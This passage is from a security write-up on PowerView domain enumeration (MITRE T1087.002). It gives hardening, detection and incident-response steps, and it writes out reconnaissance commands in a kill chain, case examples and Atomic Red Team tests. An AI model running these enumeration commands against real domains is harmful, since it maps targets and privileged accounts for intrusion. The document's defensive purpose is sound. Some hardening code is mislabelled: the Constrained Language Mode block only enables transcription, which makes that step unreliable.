  New-Item -Path $RegPath -Force | Out-Null
  Set-ItemProperty -Path $RegPath -Name "EnableScriptBlockLogging" -Value 1
  ```
  
  **Verification:**
  ```powershell
  Get-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"
  ```

* **Enable PowerShell Module Logging**
  - **Applies To:** Windows 10+, Server 2016+
  
  **Manual Steps:**
  ```powershell
  $RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
  New-Item -Path $RegPath -Force | Out-Null
  Set-ItemProperty -Path $RegPath -Name "EnableModuleLogging" -Value 1
  New-ItemProperty -Path "$RegPath\ModuleNames" -Name "*" -Value "*" -Force
  ```

* **Deploy Constrained Language Mode**
  - Blocks execution of powerful cmdlets and APIs
  
  **Manual Steps:**
  ```powershell
  # Set PowerShell to Constrained Language Mode for specific users via AppLocker
  # Or via registry:
  $RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
  New-Item -Path $RegPath -Force | Out-Null
  Set-ItemProperty -Path $RegPath -Name "EnableTranscripting" -Value 1
  Set-ItemProperty -Path $RegPath -Name "OutputDirectory" -Value "C:\PowerShell\Logs"
  ```

### Priority 2: HIGH

* **Implement PowerShell Transcription Logging**
  - Records all PowerShell input and output
  
  **Manual Steps (Group Policy):**
  1. **Computer Configuration** → **Administrative Templates** → **Windows PowerShell**
  2. Enable **Turn on PowerShell Transcription**
  3. Set output directory: `C:\PowerShell\Logs\`
  
  **Manual Steps (PowerShell):**
  ```powershell
  $RegPath = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription"
  Set-ItemProperty -Path $RegPath -Name "EnableTranscripting" -Value 1
  Set-ItemProperty -Path $RegPath -Name "OutputDirectory" -Value "C:\PowerShell\Logs"
  ```

* **Restrict PowerView Import via AppLocker**
  - Block execution of known malicious scripts
  
  **Manual Steps (AppLocker):**
  1. Open **Local Security Policy** (secpol.msc) or **Group Policy**
  2. Navigate to **Application Control Policies** → **AppLocker**
  3. Create rule to block **PowerView.ps1** by hash or path
  4. Rule type: **Script Rules**
  5. Condition: File **hash** = (hash of PowerView.ps1)
  6. Action: **Deny**

* **Network Segmentation for LDAP/ADWS**
  - Restrict LDAP query sources to legitimate servers
  
  **Manual Steps (Windows Firewall):**
  ```powershell
  # Allow LDAP only from admin networks
  New-NetFirewallRule -DisplayName "Allow LDAP from Admin" `
    -Direction Inbound -Action Allow -Protocol TCP -LocalPort 389 `
    -RemoteAddress "10.0.0.0/8"
  
  # Block LDAP from user networks
  New-NetFirewallRule -DisplayName "Block LDAP from Users" `
    -Direction Inbound -Action Block -Protocol TCP -LocalPort 389 `
    -RemoteAddress "10.100.0.0/16" -Order 1
  ```

---

## 15. DETECTION & INCIDENT RESPONSE

### Forensic Artifact Collection

**If PowerView reconnaissance is suspected:**

1. **Collect PowerShell Event 4104 Logs**
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" `
     -FilterXPath "*[System[EventID=4104] and System[TimeCreated[@SystemTime > '$(Get-Date -Date (Get-Date).AddDays(-7) -Format 's')']]]" | 
     Export-Csv -Path "C:\Forensics\PowerShell_4104_7days.csv" -NoTypeInformation
   ```

2. **Collect PowerShell Process Execution (Event 4688)**
   ```powershell
   Get-WinEvent -LogName "Security" -FilterXPath "*[System[EventID=4688] and EventData[Data[@Name='CommandLine'] and contains(Data,'Get-Net')]]" | 
     Export-Csv -Path "C:\Forensics\PowerShell_Execution_7days.csv" -NoTypeInformation
   ```

3. **Collect Sysmon Network Connections**
   ```powershell
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -FilterXPath "*[System[EventID=3] and EventData[Data[@Name='InitiatingProcessName'] and contains(Data,'powershell')]]" | 
     Export-Csv -Path "C:\Forensics\PowerShell_LDAP_Connections.csv" -NoTypeInformation
   ```

### Incident Response Steps

1. **Verify PowerView Execution**
   - Confirm presence of Event 4104 entries containing PowerView cmdlets
   - Identify source user and source computer
   - Determine execution timeline and command sequence

2. **Identify Attack Scope**
   - Which cmdlets were executed (Get-NetUser, Get-NetGroup, etc.)
   - What organizational data was enumerated (OUs, groups, trusts)
   - Which user/computer accounts were targeted
   - Estimate business impact (what was exposed)

3. **Investigate Follow-On Attacks**
   - Check for Kerberoasting attempts (Event 4769 - TGS-REQ)
   - Monitor for credential spray attacks (Event 4771/4768)
   - Review logon events for lateral movement
   - Search for privilege escalation attempts

4. **Containment & Eradication**
   - If internal compromise: Force password resets for exposed accounts
   - Revoke credentials for compromised service accounts
   - Revoke Kerberos tickets (TGTs) for affected users
   - Enable additional MFA on high-privilege accounts
   - Isolate affected systems from network

5. **Recovery**
   - Rebuild compromised systems from known-good backups
   - Apply patches for known AD vulnerabilities
   - Audit all privileged account access
   - Review and reset delegation permissions

---

## 16. RELATED ATTACK CHAINS

### T1087.002 Relationship to Other MITRE Techniques

| Preceding Technique | Current Technique | Following Technique |
|-------------------|------------------|------------------|
| T1078 (Valid Accounts) | **T1087.002 (Domain Account Discovery)** | T1087.001 (Local Account Discovery) |
| T1589 (Gather Victim Identity) | ← | T1110 (Brute Force) |
| Initial Access (T1199, T1566) | ← | T1087.004 (Cloud Account Discovery) |
|  | | T1136 (Create Account) |
|  | | T1548 (Privilege Escalation) |

### Real-World Kill Chain Example

```
Phase 1: Initial Access
├─ Phishing attachment (T1566) or VPN compromise (T1199)
└─ Execute malware → reverse shell

Phase 2: Domain Reconnaissance (T1087.002)
├─ Load PowerView: Import-Module PowerView.ps1
├─ Query domain structure: Get-NetDomain
├─ Enumerate users: Get-NetUser | Export-Csv
├─ Identify privileged accounts: Get-NetGroupMember "Domain Admins"
├─ Locate high-value targets: Invoke-UserHunter -UserName "admin"
└─ Map trust relationships: Get-NetDomainTrust

Phase 3: Credential Compromise
├─ Kerberoasting (T1558.003): Request TGS for service accounts
├─ LSASS memory dump (T1003.001): Extract cached credentials
├─ Spray attack (T1110.003): Attempt weak passwords with enumerated users
└─ Lateral movement: Pass-the-hash (T1550.002)

Phase 4: Privilege Escalation (T1548)
├─ Exploit unconstrained delegation (T1548.004)
├─ Abuse constrained delegation chains
├─ Token impersonation (T1134.003)
└─ Achieve domain admin access

Phase 5: Persistence & Exfiltration
├─ Create persistence (T1547, T1098)
├─ Dump NTDS.dit (T1003.003)
├─ Exfiltrate via C2 (T1041)
└─ Lateral movement to other domains via forest trusts
```

---

## 17. REAL-WORLD EXAMPLES

### Example 1: ShadowCitadel Lab - Post-Compromise Enumeration

**Scenario:** Attacker gains shell access to single workstation, uses PowerView for domain mapping.

**Execution:**
1. Initial shell obtains: `whoami` → `COMPANY\user`
2. Load PowerView: `Import-Module PowerView.ps1`
3. Enumerate domain:
   - `Get-NetDomain` → Identifies "company.com" with 3 DCs
   - `Get-NetUser | Select-Object samaccountname, mail` → Extract user list
   - `Get-NetGroupMember -GroupName "Domain Admins"` → Identify targets
4. Discover high-privilege users:
   - `john.smith` (Domain Admin, currently logged onto DC)
   - `jane.doe` (Exchange Admin, logged onto EX01)
5. Locate users:
   - `Invoke-UserHunter -UserName "john.smith"` → Found on DC01
6. Plan lateral movement attack against DC01

**Detection Opportunities:**
- Event 4104 showing PowerView cmdlet execution
- Multiple LDAP queries from single source
- Suspicious process tree (cmd.exe → powershell.exe → PowerView.ps1)

**Response Actions:**
- Isolate compromised workstation
- Force password reset for john.smith
- Revoke Kerberos tickets (TGTs)
- Monitor DC01 for credential dumping attempts
- Audit privileged account access

---

### Example 2: Ransomware Campaign Pre-Execution Reconnaissance

**Campaign:** Revil/Kaseya Supply Chain Attack Phase (2021)

**Execution Timeline:**
- Day 1: Attacker gains access via Kaseya VSA vulnerability
- Day 2-3: Execute PowerView reconnaissance:
  ```powershell
  Get-NetComputer -Ping | Select-Object dnsHostName
  Get-NetUser -FullData | Select-Object samaccountname, mail, lastLogon
  Get-NetGroupMember "Domain Admins" | Export-Csv admins.csv
  Invoke-ShareFinder | Export-Csv shares.csv
  ```
- Day 4: Identify backup infrastructure
- Day 5: Deploy ransomware to Domain Controllers

**Intelligence Gathered:**
- Complete computer inventory (1,500+ systems)
- User list with last logon times
- Backup server locations
- High-value targets (file servers with large data)

**Detection Opportunities:**
- PowerView execution from Kaseya VSA service account
- Unusual LDAP query patterns (bulk enumeration)
- Multiple sequential Get-NetUser queries
- Invoke-ShareFinder usage (atypical for service account)

---

## 18. COMPLIANCE & STANDARDS MAPPING

| Standard | Requirement | Mapping |
|----------|-------------|---------|
| **CIS Controls v8** | CIS 6.1, 6.2 (Account Management), CIS 8.5 (Logging) | Enable PowerShell script block logging; monitor for reconnaissance |
| **DISA STIG** | Windows Server hardening | Enable audit logging; restrict PowerShell execution; apply AppLocker |
| **NIST 800-53** | AC-2 (Account Management), SI-4 (Information & Event Logging), AU-12 (Audit Generation) | Monitor AD queries; log PowerShell execution; establish alerting |
| **GDPR** | Article 32 (Security Measures), Article 33 (Breach Notification) | Detect unauthorized access to identity data; implement incident response |
| **DORA** | Operational Resilience | Monitor identity service for reconnaissance; implement alerting |
| **NIS2** | Detection & Containment | Establish baseline for normal domain queries; alert on deviations |
| **ISO 27001:2022** | 5.2 (Information Security Policies), 8.2 (Access Control), 8.15 (Logging) | Restrict domain enumeration access; enable comprehensive logging |

---

## 19. APPENDIX: ATOMIC RED TEAM INTEGRATION

### Atomic Test Reference
- **MITRE Atomic ID:** T1087_002_PowerView_Domain_Enumeration
- **Status:** Community test
- **Repository:** https://github.com/atomic-red-team/atomic-red-team

### Example Atomic Test
```yaml
- name: Enumerate Domain Users with PowerView
  description: Execute Get-NetUser to enumerate all domain users
  supported_platforms:
    - windows
  input_arguments:
    powerview_path:
      description: Path to PowerView.ps1
      type: string
      default: "C:\\PowerView.ps1"
  executor:
    name: powershell
    elevation_required: false
    command: |
      Import-Module #{powerview_path}
      Get-NetUser | Select-Object samaccountname, mail, lastLogonTimestamp

- name: Identify Domain Admins with PowerView
  description: Execute Get-NetGroupMember to identify Domain Admins
  supported_platforms:
    - windows
  input_arguments:
    powerview_path:
      description: Path to PowerView.ps1
      type: string
      default: "C:\\PowerView.ps1"
  executor:
    name: powershell
    elevation_required: false
    command: |
      Import-Module #{powerview_path}
      Get-NetGroupMember -GroupName "Domain Admins" | Select-Object MemberName
```

---

## 20. REFERENCES & ATTRIBUTION

1. **MITRE ATT&CK:** T1087.002 – Account Discovery: Domain Account
   - https://attack.mitre.org/techniques/T1087/002/

2. **PowerSploit Documentation:**
   - PowerView README: https://powersploit.readthedocs.io/en/stable/Recon/README/
   - GitHub Repository: https://github.com/PowerShellMafia/PowerSploit

3. **Detection Research:**
   - Splunk: Elevated Group Discovery with PowerView
   - https://research.splunk.com/endpoint/10d62950-0de5-4199-a710-cff9ea79b413/
   - Microsoft Threat Research: Hunting for reconnaissance activities using PowerShell

4. **PowerShell Logging Configuration:**
   - Microsoft: Configure PowerShell Script Block Logging
   - https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows

5. **Real-World Examples:**
   - ShadowCitadel Lab: Blue Team Challenge (2025)
   - Revil/Kaseya Campaign Analysis (2021)
   - NOBELIUM APT Activity Reports

---
